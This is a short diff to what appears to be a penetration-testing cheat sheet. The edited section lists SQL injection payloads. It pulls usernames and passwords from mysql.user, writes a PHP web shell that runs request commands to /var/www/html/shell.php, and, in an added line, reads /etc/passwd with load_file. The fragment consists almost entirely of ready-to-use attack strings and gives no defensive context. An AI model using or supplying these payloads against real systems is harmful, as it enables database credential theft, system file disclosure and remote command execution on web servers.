@@ -197,7 +197,8 @@ sh -f -NL 1234:localhost:5432 user@IP
 ' UNION SELECT username FROM mysql.user LIMIT 1 OFFSET 0 -- -
 ' UNION SELECT password FROM mysql.user LIMIT 1 OFFSET 1 -- -
 
-' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
+' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' -- -
+' union select load_file('/etc/passwd') -- -
 ```
 
 - Crack de hash / bruteforce password local
